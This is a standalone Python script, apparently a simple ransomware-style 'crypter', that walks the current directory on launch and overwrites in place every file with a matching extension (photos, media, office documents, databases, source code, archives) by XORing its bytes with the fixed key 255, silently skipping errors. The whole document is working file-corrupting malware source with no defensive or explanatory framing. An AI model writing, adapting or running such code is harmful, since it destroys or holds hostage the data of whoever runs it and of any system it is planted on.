
import sys
import os

class crypter() :

	def __init__(self , key) :

		self.key = key

		''' The path of the wanted file or directory
			Note : can be changed
		'''

		self.path = "."

		''' List of extensions '''

		self.ex = [
			'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',
			'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape',
			'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',
			'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx',
			'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',
			'yml', 'yaml', 'json', 'xml', 'csv',
			'db', 'sql', 'dbf', 'mdb', 'iso',
			'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',
			'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',
			'java', 'class', 'jar' , 
			'ps', 'bat', 'vb',
			'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',
			'go', 'py', 'pyc', 'bf', 'coffee',
			'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',]

		''' Checks the extension of a given file '''

		self.check_ex = lambda f : True if len(f.split(".")) > 1 and f.split(".")[1] in self.ex else False
	
		if self.check_type(self.path) :
			self.encrypt(self.path)
		
		else :
			for root , dirs , files in os.walk(self.path) :
				for file in files :
					self.encrypt(os.path.join(root , file))

	''' checks for whether the given parameter is a file or a directory '''

	def check_type(self , f) :
		return True if os.path.isfile(self.path) else False

	def encrypt(self , f) :

		''' If the file's extension is one of the list declared above then start XoRing '''

		if self.check_ex(f) :

			try :
				with open(f , mode = "rb") as _file :
					rd = bytearray(_file.read())
				for n , v in enumerate(rd) :
					rd[n] = v ^ self.key
				with open(f , mode = "wb") as _nf :
					_nf.write(rd)

				''' This exception is especially for file permissions '''

			except :
				pass


if __name__ == "__main__" :

	final = crypter(255)
	final
